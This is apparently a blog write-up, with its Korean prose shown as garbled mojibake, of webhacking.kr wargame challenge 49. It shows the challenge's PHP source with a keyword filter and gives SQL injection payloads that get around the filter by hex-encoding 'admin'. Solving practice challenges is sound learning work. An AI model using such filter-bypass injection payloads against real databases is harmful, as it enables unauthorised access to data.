---
title: "[webhacking.kr] 49ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "49ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 49ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152792504-e79a6af9-6eb6-4943-ab61-af213229089e.png)

  ```php
<?php
  if($_GET['lv']){
    $db = dbconnect();
    if(preg_match("/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",$_GET['lv'])) exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall49 where lv={$_GET['lv']}"));
    echo $result[0] ;
    if($result[0]=="admin") solve(49);
  }
?>
  ```

# ë¬¸ì œ í’€ì´
  injectionì„ í•´ì•¼ í•˜ëŠ” sqlë¬¸ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```sql
select id from chall49 where lv={}
  ```

  ìš°ì„  ì´ˆê¸° ì¸ì ì…˜ í˜ì´ë¡œë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í•©ë‹ˆë‹¤.
  ```sql
100||id='admin'
  ```

  ìœ„ì˜ í˜ì´ë¡œë“œì¤‘ í•„í„°ë§ì— ê±¸ë¦¬ëŠ” ë¶€ë¶„ì€ "'"ë°–ì— ì—†ìŠµë‹ˆë‹¤.
  'admin' ëŒ€ì‹ ì— 0x61646d696eë¡œ ë°”ê¿”ì„œ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤.

  ```sql
100||id=0x61646d696e
  ```

  ![image](https://user-images.githubusercontent.com/33647663/152793795-065137f4-63c3-4cc9-9edf-5197eec1e931.png)